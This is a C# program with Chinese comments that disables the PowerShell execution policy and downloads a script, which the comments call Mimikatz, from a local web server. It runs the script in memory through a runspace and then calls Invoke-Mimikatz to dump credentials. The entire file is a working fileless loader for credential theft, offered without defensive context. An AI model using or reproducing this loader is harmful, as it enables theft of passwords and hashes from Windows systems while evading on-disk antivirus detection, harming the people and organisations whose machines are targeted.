using System;
using System.IO;
using System.Net;
using System.Text;
using System.Management.Automation.Runspaces;
using System.Management.Automation;

namespace ExecutingPowerShellFromMemory
{
    class Program
    {
        static void Main(string[] args)
        {
            // 将执行策略设置为 Unrestricted
            PowerShell ps = PowerShell.Create();
            ps.AddScript("Set-ExecutionPolicy Unrestricted");
            ps.Invoke();

            // 远程拉取Mimikatz函数代码
            string url = "http://127.0.0.1:8000/1.ps1";
            WebClient client = new WebClient();
            byte[] scriptBytes = client.DownloadData(url);
            string scriptContents = Encoding.UTF8.GetString(scriptBytes);

            // 创建Runspace和Pipeline对象
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();

            // 添加PowerShell命令
            pipeline.Commands.Clear();
            pipeline.Commands.AddScript("$ErrorActionPreference = 'Continue'");
            pipeline.Commands.AddScript(scriptContents);
            pipeline.Commands.AddScript("Invoke-Mimikatz");

            // 执行命令
            var results = pipeline.Invoke();

            // 显示结果
            foreach (var result in results)
            {
                Console.WriteLine(result.ToString());
            }

            // 关闭管道和runspace
            pipeline.Dispose();
            runspace.Dispose();
            Console.ReadLine();
        }
    }
}